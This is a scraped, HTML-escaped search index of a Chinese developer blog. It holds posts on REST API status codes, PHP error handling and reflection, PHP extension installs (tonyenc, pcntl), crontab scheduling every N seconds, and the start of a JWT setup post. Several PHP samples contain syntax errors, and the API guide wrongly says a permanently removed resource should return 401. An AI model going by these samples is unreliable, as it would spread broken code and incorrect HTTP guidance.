&lt;p&gt;这里我们 应该 采用第二种方式，因为大多数情况下，客户端只需要知道该请求操作成功与否，并不需要返回新资源的信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;202-accepted&#34;&gt;202 Accepted&lt;/h3&gt;
&lt;p&gt;该状态码表示服务器已经接受到了来自客户端的请求，但还未开始处理。常用短信发送、邮件通知、模板消息推送等这类很耗时需要队列支持的场景中；&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;返回该状态码时，响应实体 必须 为空。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 202 Accepted
Server: nginx/1.11.9
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Date: Sun, 24 Jun 2018 09:25:15 GMT
Connection: keep-alive
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;204-no-content&#34;&gt;204 No Content&lt;/h3&gt;
&lt;p&gt;该状态码表示响应实体不包含任何数据，其中：&lt;/p&gt;
&lt;p&gt;在使用 DELETE 方法删除资源 成功 时，必须 返回该状态码&lt;br&gt;
使用 PUT、PATCH 方法更新数据 成功 时，也 应该 返回此状态码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 204 No Content
Server: nginx/1.11.9
Date: Sun, 24 Jun 2018 09:29:12 GMT
Connection: keep-alive
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3xx-重定向&#34;&gt;3xx 重定向&lt;/h3&gt;
&lt;p&gt;所有 API 一定不可 返回 3xx 类型的状态码。因为 3xx 类型的响应格式一般为下列格式:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 302 Found
Server: nginx/1.11.9
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 09:41:50 GMT
Location: https://example.com
Connection: keep-alive

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot; /&amp;gt;
        &amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0;url=https://example.com&amp;quot; /&amp;gt;

        &amp;lt;title&amp;gt;Redirecting to https://example.com&amp;lt;/title&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;
        Redirecting to &amp;lt;a href=&amp;quot;https://example.com&amp;quot;&amp;gt;https://example.com&amp;lt;/a&amp;gt;.
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;API 一定不可 返回纯 HTML 结构的响应；若一定要使用重定向功能，应该 返回一个响应实体为空的 3xx 响应，并在响应头中加上 Location 字段:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 302 Found
Server: nginx/1.11.9
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Date: Sun, 24 Jun 2018 09:52:50 GMT
Location: https://godruoyi.com
Connection: keep-alive
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;400-bad-request&#34;&gt;400 Bad Request&lt;/h3&gt;
&lt;p&gt;由于明显的客户端错误（例如，请求语法格式错误、无效的请求、无效的签名等），服务器 应该 放弃该请求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当服务器无法从其他 4xx 类型的状态码中找出合适的来表示错误类型时，都 必须 返回该状态码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 400 Bad Request
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 13:22:36 GMT
Connection: keep-alive

{&amp;quot;error_code&amp;quot;:40000,&amp;quot;message&amp;quot;:&amp;quot;无效的签名&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;401-unauthorized&#34;&gt;401 Unauthorized&lt;/h3&gt;
&lt;p&gt;该状态码表示当前请求需要身份认证，以下情况都 必须 返回该状态码。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未认证用户访问需要认证的 API&lt;/li&gt;
&lt;li&gt;access_token 无效/过期&lt;/li&gt;
&lt;li&gt;客户端在收到 401 响应后，都 应该 提示用户进行下一步的登录操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 401 Unauthorized
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
WWW-Authenticate: JWTAuth
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 13:17:02 GMT
Connection: keep-alive

&amp;quot;message&amp;quot;:&amp;quot;Token Signature could not be verified.&amp;quot;,&amp;quot;error_code&amp;quot;: &amp;quot;40100&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;403-forbidden&#34;&gt;403 Forbidden&lt;/h3&gt;
&lt;p&gt;该状态码可以简单的理解为没有权限访问该请求，服务器收到请求但拒绝提供服务。&lt;/p&gt;
&lt;p&gt;如当普通用户请求操作管理员用户时，必须 返回该状态码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 403 Forbidden
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 13:05:34 GMT
Connection: keep-alive

{&amp;quot;error_code&amp;quot;:40301,&amp;quot;message&amp;quot;:&amp;quot;权限不足&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;404-not-found&#34;&gt;404 Not Found&lt;/h3&gt;
&lt;p&gt;该状态码表示用户请求的资源不存在，如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取不存在的用户信息 （get /users/9999999）&lt;/li&gt;
&lt;li&gt;访问不存在的端点&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;都 必须 返回该状态码，若该资源已永久不存在，则 应该 返回 401 响应。&lt;/p&gt;
&lt;h3 id=&#34;405-method-not-allowd&#34;&gt;405 Method Not Allowd&lt;/h3&gt;
&lt;p&gt;当客户端使用的 HTTP 请求方法不被服务器允许时，必须 返回该状态码。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如客户端调用了 POST 方法来访问只支持 GET 方法的 API&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;该响应 必须 返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 405 Method Not Allowed
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Allow: GET, HEAD
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 12:30:57 GMT
Connection: keep-alive

{&amp;quot;message&amp;quot;:&amp;quot;405 Method Not Allowed&amp;quot;,&amp;quot;error_code&amp;quot;: 40500}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;406-not-acceptable&#34;&gt;406 Not Acceptable&lt;/h3&gt;
&lt;p&gt;API 在不支持客户端指定的数据格式时，应该返回此状态码。如支持 JSON 和 XML 输出的 API 被指定返回 YAML 格式的数据时。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Http 协议一般通过请求首部的 Accept 来指定数据格式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;408-request-timeout&#34;&gt;408 Request Timeout&lt;/h3&gt;
&lt;p&gt;客户端请求超时时 必须 返回该状态码，需要注意的时，该状态码表示 客户端请求超时，在涉及第三方 API 调用超时时，一定不可 返回该状态码。&lt;/p&gt;
&lt;h3 id=&#34;409-gonfilct&#34;&gt;409 Gonfilct&lt;/h3&gt;
&lt;p&gt;该状态码表示因为请求存在冲突无法处理。如通过手机号码提供注册功能的 API，当用户提交的手机号已存在时，必须 返回此状态码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 409 Conflict
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 12:19:04 GMT
Connection: keep-alive

{&amp;quot;error_code&amp;quot;:40900,&amp;quot;message&amp;quot;:&amp;quot;手机号已存在&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;410-gone&#34;&gt;410 Gone&lt;/h3&gt;
&lt;p&gt;和 404 类似，该状态码也表示请求的资源不存在，只是 410 状态码进一步表示所请求的资源已不存在，并且未来也不会存在。在收到 410 状态码后，客户端 应该 停止再次请求该资源。&lt;/p&gt;
&lt;h3 id=&#34;413-request-entity-too-large&#34;&gt;413 Request Entity Too Large&lt;/h3&gt;
&lt;p&gt;该状态码表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;此种情况下，服务器可以关闭连接以免客户端继续发送此请求。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果这个状况是临时的，服务器 应该 返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。&lt;/p&gt;
&lt;h3 id=&#34;414-request-uri-too-long&#34;&gt;414 Request-URI Too Long&lt;/h3&gt;
&lt;p&gt;该状态码表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。&lt;/p&gt;
&lt;h3 id=&#34;415-unsupported-media-type&#34;&gt;415 Unsupported Media Type&lt;/h3&gt;
&lt;p&gt;通常表示服务器不支持客户端请求首部 Content-Type 指定的数据格式。如在只接受 JSON 格式的 API 中放入 XML 类型的数据并向服务器发送，都 应该 返回该状态码。&lt;/p&gt;
&lt;p&gt;该状态码也可用于如：只允许上传图片格式的文件，但是客户端提交媒体文件非法或不是图片类型，这时 应该 返回该状态码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 415 Unsupported Media Type
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 12:09:40 GMT
Connection: keep-alive

{&amp;quot;error_code&amp;quot;:41500,&amp;quot;message&amp;quot;:&amp;quot;不允许上传的图片格式&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;429-too-many-request&#34;&gt;429 Too Many Request&lt;/h3&gt;
&lt;p&gt;该状态码表示用户请求次数超过允许范围。如 API 设定为 60次/分钟，当用户在一分钟内请求次数超过 60 次后，都 应该 返回该状态码。并且也 应该 在响应首部中加上下列头部：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;X-RateLimit-Limit: 10 请求速率（由应用设定，其单位一般为小时/分钟等，这里是 10次/5分钟）
X-RateLimit-Remaining: 0 当前剩余的请求数量
X-RateLimit-Reset: 1529839462 重置时间
Retry-After: 120 下一次访问应该等待的时间（秒）
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;列子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 429 Too Many Requests
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1529839462
Retry-After: 290
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 11:19:32 GMT
Connection: keep-alive

{&amp;quot;message&amp;quot;:&amp;quot;You have exceeded your rate limit.&amp;quot;,&amp;quot;error_code&amp;quot;:42900}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;必须 为所有的 API 设置 Rate Limit 支持。&lt;/p&gt;
&lt;h3 id=&#34;500-internal-server-error&#34;&gt;500 Internal Server Error&lt;/h3&gt;
&lt;p&gt;该状态码 必须 在服务器出错时抛出，对于所有的 500 错误，都 应该 提供完整的错误信息支持，也方便跟踪调试。&lt;/p&gt;
&lt;h3 id=&#34;503-service-unavailable&#34;&gt;503 Service Unavailable&lt;/h3&gt;
&lt;p&gt;该状态码表示服务器暂时处理不可用状态，当服务器需要维护或第三方 API 请求超时/不可达时，都 应该 返回该状态码，其中若是主动关闭 API 服务，应该在返回的响应首部加上 Retry-After 头部，表示多少秒后可以再次访问。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 503 Service Unavailable
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 10:56:20 GMT
Retry-After: 60
Connection: keep-alive

{&amp;quot;error_code&amp;quot;:50300,&amp;quot;message&amp;quot;:&amp;quot;服务维护中&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其他 HTTP 状态码请参考 &lt;a href=&#34;https://link.juejin.im/?target=https%3A%2F%2Fzh.wikipedia.org%2Fzh-hans%2FHTTP%25E7%258A%25B6%25E6%2580%2581%25E7%25A0%2581&#34;&gt;HTTP 状态码- 维基百科&lt;/a&gt;。&lt;/p&gt;
">RESETful API 设计规范</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/php-zhong-de-cuo-wu-chu-li/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;PHP里有一套错误处理机制，可以使用set_error_handler接管PHP错误处理，也可以使用trigger_error函数主动抛出一个错误。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;set_error_handler&#34;&gt;set_error_handler&lt;/h3&gt;
&lt;p&gt;set_error_handler()函数设置用户自定义的错误处理函数。函数用于创建运行期间的用户自己的错误处理方法。它需要先创建一个错误处理函数，然后设置错误级别。语法如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;set_error_handler(error_function, error_type)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;error_function :发生错误时运行的函数&lt;/li&gt;
&lt;li&gt;error_type : 错误级别，默认为E_ALL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果使用该函数，会完全绕过PHP错误处理函数，如果有必要，自定义的错误处理程序必须终止脚本&lt;/p&gt;
&lt;p&gt;如果在脚本执行前发生错误，那时自定义程序还没有注册，就不会用到自定义错误处理程序&lt;/p&gt;
&lt;h3 id=&#34;自定义异常处理&#34;&gt;自定义异常处理&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

function customError($errno, $errstr, $errfile, $errline)
{
    echo &#39;错误代码:&#39;$errno.$errstr;
    echo &#39;错误所在:&#39;$errfile.$errline;
}

set_error_handler(customError, E_ALL|E_STRICT);

$a = [&#39;o&#39; =&amp;gt; 2,4,5];

echo $a[&#39;o&#39;];

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;自定义的错误处理函数一定要有这四个输入变量＄errno、＄errstr、＄errfile、＄errline&lt;/p&gt;
&lt;p&gt;errno是一组常量，代表错误的等级，同时也有一组整数和其对应，但一般使用其字符串值表示，这样语义更好一点。比如E_WARNING，其二进制掩码为4.，表示警告信息&lt;/p&gt;
&lt;p&gt;接下来，就是将这个函数作为回调参数传递给set_error_handler。这样就能接管PHP原生的错误处理函数了。要注意的是，这种托管方式并不能托管所有种类的错误，如E_ERROR、E_PARSE、E_CORE_ERROR、E_CORE_WARNING、E_COMPILE_ERROR、E_COMPILE_WARNING，以及E_STRICT中的部分。这些错误会以最原始的方式显示，或者不显示&lt;/p&gt;
&lt;h3 id=&#34;restore_error_handler&#34;&gt;restore_error_handler&lt;/h3&gt;
&lt;p&gt;set_error_handler函数会接管PHP内置的错误处理，可以在同一个页面使用restore_error_handler()；取消接管&lt;/p&gt;
&lt;p&gt;如果使用自定义的set_error_handler接管PHP的错误处理，代码里的错误抑制@将失效，这种错误也会被显示&lt;/p&gt;
&lt;p&gt;在PHP异常中，异常处理机制是有限的，无法自动抛出异常，必须手动进行，并且内置异常有限。PHP把许多异常看作错误，这样就可以把这些“异常”像错误一样用set_error_handler接管，进而主动抛出异常&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
function customError($errno, $errstr, $errfile, $errline)
{
    throw new Exception($errno.&#39;|&#39;.$errstr);
}

set_error_handler(&#39;customError&#39;, E_ALL|E_STRICT);

try
{
    $a = 5/0;
}
catch(Exception $e)
{
    echo $e-&amp;gt;getMessage();
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样就能捕获到异常和非致命的错误，可以弥补PHP异常处理机制的部分不足&lt;/p&gt;
&lt;h3 id=&#34;register_shutdown_function&#34;&gt;register_shutdown_function&lt;/h3&gt;
&lt;p&gt;fetal error这样的错误捕获不到，也无法在发生此错误后恢复流程处理，但是还是可以使用一些特殊方法对这种错误进行处理。这需要用到&lt;code&gt;register_shutdown_function()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此函数会在PHP程序终止或者die时触发一个函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

class Shutdown
{
    public function stop()
    {
        if (error_get_last()) {
            print_r(error_get_last);
        }

        die(&#39;Stop&#39;);
    }

    register_shutdown_function([new Shutdown(), &#39;stop&#39;]);

    $a = new a();

    echo &#39;end&#39;;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于fetal error还能做点收尾工作，但是PHP流程的终止是必然的。对于Parse error级别的错误，除了可以修改配置文件php.ini，什么都做不了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;log_errors = On
error_log = usr/log/php.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样一旦PHP发生了错误，就会被记入log文件，方便以后查询&lt;/p&gt;
&lt;h3 id=&#34;trigger_error&#34;&gt;trigger_error&lt;/h3&gt;
&lt;p&gt;和exception类似，错误处理也有对应抛出错误的函数，那就是trigger_error函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

$d = 0;

if ($d == 0) {
    trigger_error(&#39;cannot d by zero&#39;, E_USER_ERROR);
}

echo &#39;break&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;结语&#34;&gt;结语&lt;/h3&gt;
&lt;p&gt;在PHP中，错误和异常是两个不同的概念，这种设计从根本上导致了PHP的异常和其他语言相异。以Java为例，Java中，异常是错误唯一的报告方式。说到底，两者的区别就是对异常和错误的认识不同而产生的。PHP的异常绝大部分必须通过某种办法手动抛出，才能被捕获到，是一种半自动化的异常处理机制。 无论是错误还是异常，都可以使用handler接管系统已有的处理机制&lt;/p&gt;
">PHP中的错误处理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/php-lei-fan-she/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射，反射直观的理解就是根据到达地找出出发地和来源&lt;/p&gt;
&lt;p&gt;反射指在PHP运行状态中，扩展分析PHP程序，到处或提取出类，方法，属性，参数等详细信息，包括注释&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

class Person {
    public $name;
    public $gender;

    public function say()
    {
        echo $this-&amp;gt;name &#39;:&#39; $this-&amp;gt;gender;
    }

    public function __set($name, $value)
    {
        echo &#39;setting $name to $value&#39;;

        $this-&amp;gt;$name = $value;
    }

    public function __get($name)
    {
        if (!isset($this-&amp;gt;$name)) {
            echo &#39;未设置&#39;;
            $this-&amp;gt;$name = &#39;默认值&#39;;

        }

        return $this-&amp;gt;$name;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$student = new Person();

$student-&amp;gt;name = &#39;Ton&#39;;
$student-&amp;gt;gender = &#39;male&#39;;
$student-&amp;gt;age = &#39;24&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;使用api获取属性和方法&#34;&gt;使用API获取属性和方法&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;//获取对象属性列表

$reflect = new ReflectionObject($student);
$props = $reflect-&amp;gt;getProperties();

foreach ($props as $prop) {
    print $prop-&amp;gt;getName();
}

//获取对象方法列表
$m = $reflect-&amp;gt;getMethods();
foreach ($m as $prop) {
    print $prop-&amp;gt;getName();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;使用class函数获取属性和方法&#34;&gt;使用class函数获取属性和方法&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;//返回对象属性的关联数组
var_dump(get_object_vars($student));
//类属性
var_dump(get_class_vars(get_class($student)));
//返回由类的方法组成的数组
var_dump(get_class_methonds(get_class($student)));
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;获取对象属于哪个类&#34;&gt;获取对象属于哪个类&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;echo get_class($student);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;还原类原型&#34;&gt;还原类原型&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;//反射获取类的原型
$obj = new ReflectionClass(&#39;person&#39;);
$className = $obj-&amp;gt;getName();
$methods = $properties = [];

foreach ($obj-&amp;gt;getProperties() as $v) {
    $properties[$v-&amp;gt;getName()] = $v;
}

foreach ($obj-&amp;gt;getMethods() as $v) {
    $methods[$v-&amp;gt;getName()] = $v;
}

echo &amp;quot;class {$className}&amp;quot;;

is_array($properties) &amp;amp;&amp;amp; ksort($properties);

foreach($properties as $k =&amp;gt; $v) {
    echo $v-&amp;gt;isPublic ? &#39;public&#39; : &#39;&#39;;
    echo $v-&amp;gt;isPrivate ? &#39;private&#39; : &#39;&#39;;
    echo $v-&amp;gt;isProtected ? &#39;protected&#39; : &#39;&#39;;
    echo $v-&amp;gt;static ? &#39;static&#39; : &#39;&#39;;
}

if (is_array($methods)) ksort($methods);

foreach ($methods as $k =&amp;gt; $v) {
    echo &amp;quot;function{$k}(){}&amp;quot;;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;PHP手册关于反射API有几十个，反射完整的描述了一个类或对象的原型，反射不仅可以用于类和对象，还可以用于函数，扩展模块，异常等&lt;/p&gt;
&lt;h3 id=&#34;结语&#34;&gt;结语&lt;/h3&gt;
&lt;p&gt;善用反射能保持代码的优雅和简洁，但反射也会破坏类的封装性，因为反射可以使本不该暴露的方法或属性被强制暴露了出来，是优点也是缺点&lt;/p&gt;
">PHP类反射</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/php-dai-ma-jia-mi-tonyenc/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;最近公司出售了一个项目，商业源码自然要加密，网上的一些加密被破解的可能性较大，用起来也不方便，作为github的伟大搬运工，找到了一个简洁、高性能、跨平台的 PHP7 代码加密扩展-tonyenc&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;github项目地址：https://github.com/lihancong/tonyenc&lt;/p&gt;
&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git clone https://github.com/lihancong/tonyenc

cd tonyenc

phpize

./configure --with-php-config = [自己php版本的php-config文件]

make &amp;amp;&amp;amp; make install
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;php版本要7.0以上&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;修改php.ini文件追加扩展&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;extension=tonyenc.so
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;MAMP软件中修改php.ini模版文件，是无效的，要修改真实的php.ini文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;搞定后重启环境，测试是否成功&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;php -m |grep tonyenc
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;加密&#34;&gt;加密&lt;/h3&gt;
&lt;h4 id=&#34;加密不可逆切记要备份&#34;&gt;加密不可逆，切记要备份！！！！&lt;/h4&gt;
&lt;p&gt;加密文件，这个文件它提供了，名字叫tonyenc.php，复制保存到合适位置，然后执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;php tonyenc.php [需要加密的文件或路径]
&lt;/code&gt;&lt;/pre&gt;
">php代码加密-tonyenc</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/mac-an-zhuang-php-kuo-zhan-pcntl/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;在 Mac 下做 PHP 开发用的是 MAMP 集成开发环境，出现 PHP 不支持 pcntl 扩展，查下谷歌发现 MAMP 的集成环境是没有这个扩展包的，需要手动编译安装这个包。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h3 id=&#34;具体步骤&#34;&gt;具体步骤&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;
# 下载源码包
wget http://cn.php.net/distributions/php-7.2.1.tar.gz

# 解压
tar zxvf php-7.2.1.tar.gz

# 进入文件执行编译
cd php-7.2.1/ext/pcntl
phpize
./configure
make

# 拷贝编译.so文件到MAMP extensions目录(具体的文件夹看自己的目录哦)
cp modules/pcntl.so /Applications/MAMP/bin/php/php7.2.1/lib/php/extensions/no-debug-non-zts-20170718

# 编辑php.ini引入扩展
echo &amp;quot;extension=pcntl.so&amp;quot; &amp;gt;&amp;gt; /Applications/MAMP/bin/php/php7.2.1/conf/php.ini
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;检查是否安装成功&#34;&gt;检查是否安装成功&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;
php --ri pcntl
&lt;/code&gt;&lt;/pre&gt;
">Mac 安装 PHP 扩展 pcntl</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/crontab-shi-xian-n-miao-ding-shi/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;crontab 命令最小的执行时间是一分钟，有时需要按秒执行定时任务，有两种方法可以实现&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;使用延时来实现每n秒执行&#34;&gt;使用延时来实现每N秒执行&lt;/h3&gt;
&lt;p&gt;通过延时方法 sleep N 来实现每N秒执行，首先创建一个php脚本test.php,本例test.php放在home目录下，功能是把当前时间写入/log/run.log&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;crontab -e
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入以下语句保存退出：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;* * * * * php /home/test.php
* * * * * sleep 10; php /home/test.php
* * * * * sleep 20; php /home/test.php
* * * * * sleep 30; php /home/test.php
* * * * * sleep 40; php /home/test.php
* * * * * sleep 50; php /home/test.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用 tail -f 查看执行情况&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;tail -f /log/run.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;60必须能整除间隔的秒数，如果间隔的秒数太少，例如2秒执行一次，这样就需要在crontab 加入60/2=30条语句&lt;/p&gt;
&lt;h3 id=&#34;编写shell脚本实现&#34;&gt;编写shell脚本实现&lt;/h3&gt;
&lt;p&gt;在脚本中使用for语句指定秒数执行，创建脚本文件crontab.sh,j本例放在home目录下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;#!/bin/bash

step=2 #间隔的秒数，不能大于60

for (( i = 0; i &amp;lt; 60; i=(i+step) )); do
    $(php &#39;/home/test.php&#39;)
    sleep $step
done

exit 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;crontab -e 输入以下语句后保存退出：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;* * * * * /home/crontab.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用 tail -f 查看执行情况，可以发现run.log每2秒被写入一条记录。如果60不能整除间隔的秒数，则需要调整执行的时间。例如需要每7秒执行一次，就需要找到7与60的最小公倍数，7与60的最小公倍数是420（即7分钟）。&lt;/p&gt;
&lt;p&gt;则 crontab.sh step的值为7，循环结束条件i&amp;lt;420， crontab=&amp;quot;&amp;quot; -e可以输入以下语句来实现:&lt;code&gt;&amp;lt;=&amp;quot;&amp;quot; p=&amp;quot;&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;*/7 * * * * /home/crontab.sh
&lt;/code&gt;&lt;/pre&gt;
">crontab实现N秒定时</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/qing-song-sheng-cheng-jwt-de-cha-jian/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;json web token，无需多说&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;composer require lcobucci/jwt
